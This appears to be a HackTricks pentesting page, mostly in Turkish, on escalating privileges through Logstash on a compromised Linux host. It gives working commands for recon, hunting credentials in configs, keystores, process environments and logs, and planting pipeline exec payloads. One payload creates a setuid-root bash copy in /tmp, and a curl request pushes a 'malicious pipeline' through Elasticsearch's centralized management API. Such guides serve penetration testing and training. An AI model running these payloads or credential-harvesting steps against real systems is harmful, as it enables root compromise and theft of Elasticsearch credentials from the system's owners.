# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash, **logları toplamak, dönüştürmek ve göndermek** için **pipelines** olarak bilinen bir sistem aracılığıyla kullanılır. Bu **pipelines**, **input**, **filter** ve **output** aşamalarından oluşur. Logstash'in ele geçirilmiş bir makinede çalışması durumunda ilginç bir durum ortaya çıkar.

### Pipeline Yapılandırması

Pipelines, pipeline yapılandırmalarının konumlarını listeleyen **/etc/logstash/pipelines.yml** dosyasında yapılandırılır:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Bu dosya, pipeline yapılandırmalarını içeren **.conf** dosyalarının nerede bulunduğunu gösterir. Bir **Elasticsearch output module** kullanıldığında, **pipelines**'larda genellikle **Elasticsearch credentials** bulunur; bunlar, Logstash'ın Elasticsearch'e veri yazma gereksinimi nedeniyle genellikle geniş ayrıcalıklara sahiptir. Yapılandırma yollarındaki Wildcards, Logstash'ın belirtilen dizindeki eşleşen tüm pipelines'ları çalıştırmasına olanak tanır.

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, **all files inside that directory are concatenated in lexicographical order and parsed as a single config**. This creates 2 offensive implications:

- A dropped file like `000-input.conf` or `zzz-output.conf` can change how the final pipeline is assembled
- A malformed file can prevent the whole pipeline from loading, so validate payloads carefully before relying on auto-reload

### Ele Geçirilmiş Bir Host Üzerinde Hızlı Keşif

Logstash'ın yüklü olduğu bir makinede hızlıca şunları kontrol edin:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ayrıca yerel monitoring API'sine erişilip erişilemediğini kontrol edin. Varsayılan olarak **127.0.0.1:9600** adresine bind olur; host üzerinde erişim sağlandıktan sonra bu genellikle yeterlidir:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Bu genellikle size pipeline ID'leri, çalışma zamanı detayları ve değiştirdiğiniz pipeline'ın yüklendiğine dair onayı verir.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Writable Pipelines ile Privilege Escalation

Privilege Escalation girişimi yapmak için, önce Logstash servisinin hangi kullanıcı hesabı altında çalıştığını belirleyin; genellikle **logstash** kullanıcısıdır. Aşağıdaki kriterlerden **birini** karşıladığınızdan emin olun:

- Bir pipeline **.conf** dosyasına **yazma erişimine** sahip olmak **veya**
- **/etc/logstash/pipelines.yml** dosyası bir wildcard kullanıyor ve hedef klasöre yazabiliyor olmak

Ek olarak, aşağıdaki koşullardan **biri** yerine getirilmelidir:

- Logstash servisini yeniden başlatabilme yeteneğine sahip olmak **veya**
- **/etc/logstash/logstash.yml** dosyasında **config.reload.automatic: true** ayarlı olmak

Yapılandırmada bir wildcard varsa, bu wildcard ile eşleşen bir dosya oluşturmak komut yürütmeye izin verir. Örneğin:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Burada, **interval** saniye cinsinden çalıştırma sıklığını belirler. Verilen örnekte, **whoami** komutu her 120 saniyede bir çalışır ve çıktısı **/tmp/output.log**'a yönlendirilir.

**config.reload.automatic: true** ile **/etc/logstash/logstash.yml** içinde, Logstash yeniden başlatmaya gerek kalmadan yeni veya değiştirilmiş pipeline yapılandırmalarını otomatik olarak algılar ve uygular. Eğer bir wildcard yoksa, mevcut yapılandırmalarda yine de değişiklik yapılabilir; ancak kesintileri önlemek için dikkatli olunmalıdır.

### Daha Güvenilir Pipeline Payload'ları

`exec` input plugin mevcut sürümlerde hâlâ çalışır ve ya bir `interval` ya da bir `schedule` gerektirir. Bu, Logstash JVM'i **forking** yaparak çalıştırır; bu yüzden bellek kısıtlıysa payload'ınız sessizce çalışmak yerine `ENOMEM` ile başarısız olabilir.

Daha pratik bir privilege-escalation payload genellikle kalıcı bir artefakt bırakanıdır:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Yeniden başlatma yetkiniz yok ancak sürece sinyal gönderebiliyorsanız, Logstash Unix-benzeri sistemlerde **SIGHUP** ile tetiklenen yeniden yüklemeyi de destekler:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Her eklentinin yeniden yüklemeye uygun olmadığını unutmayın. Örneğin, **stdin** input otomatik yeniden yüklemeyi engeller; bu yüzden `config.reload.automatic`'ın değişikliklerinizi her zaman algılayacağını varsaymayın.

### Logstash'tan Gizli Bilgileri Çalma

Sadece kod yürütmeye odaklanmadan önce, Logstash'in zaten erişimi olan verileri toplayın:

- Düz metin kimlik bilgileri genellikle `elasticsearch {}` çıktılarında, `http_poller`, JDBC input'larında veya bulut ile ilgili ayarlarda sabit kodlanmıştır
- Güvenli ayarlar **`/etc/logstash/logstash.keystore`** içinde veya başka bir `path.settings` dizininde bulunuyor olabilir
- Keystore parolası genellikle **`LOGSTASH_KEYSTORE_PASS`** aracılığıyla sağlanır ve paket tabanlı kurulumlar genellikle bunu **`/etc/sysconfig/logstash`**'tan alır
- `${VAR}` ile yapılan ortam değişkeni genişletmesi Logstash başlatılırken çözülür; bu yüzden servis ortamını incelemek faydalıdır

Yararlı kontroller:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Bu ayrıca kontrol edilmeye değer çünkü **CVE-2023-46672**, Logstash'ın belirli koşullar altında günlüklerde hassas bilgileri kaydedebileceğini gösterdi. Bir post-exploitation host'ta, eski Logstash logları ve `journald` girdileri, güncel konfigürasyon keystore'u referans gösterse ve sırları satır içi saklamasa bile kimlik bilgilerini ifşa edebilir.

### Merkezi Pipeline Yönetimi İstismarı

Bazı ortamlarda host yerel `.conf` dosyalarına hiç güvenmez. Eğer **`xpack.management.enabled: true`** yapılandırılmışsa, Logstash Elasticsearch/Kibana'dan merkezi olarak yönetilen pipeline'ları çekebilir ve bu modu etkinleştirdikten sonra yerel pipeline konfigürasyonları artık birincil kaynak olmaz.

Bu, farklı bir saldırı yolu anlamına gelir:

1. Yerel Logstash ayarlarından, keystore'dan veya loglardan Elastic kimlik bilgilerini kurtarın
2. Hesabın **`manage_logstash_pipelines`** cluster ayrıcalığına sahip olup olmadığını doğrulayın
3. Merkezi olarak yönetilen bir pipeline oluşturun veya değiştirin; böylece Logstash host'u bir sonraki sorgulama aralığında payload'unuzu çalıştırır

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Bu, yerel dosyalar salt okunur durumda olduğunda ancak Logstash zaten uzaktan pipeline'ları çekmek üzere kayıtlıysa özellikle kullanışlıdır.

## Kaynaklar

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
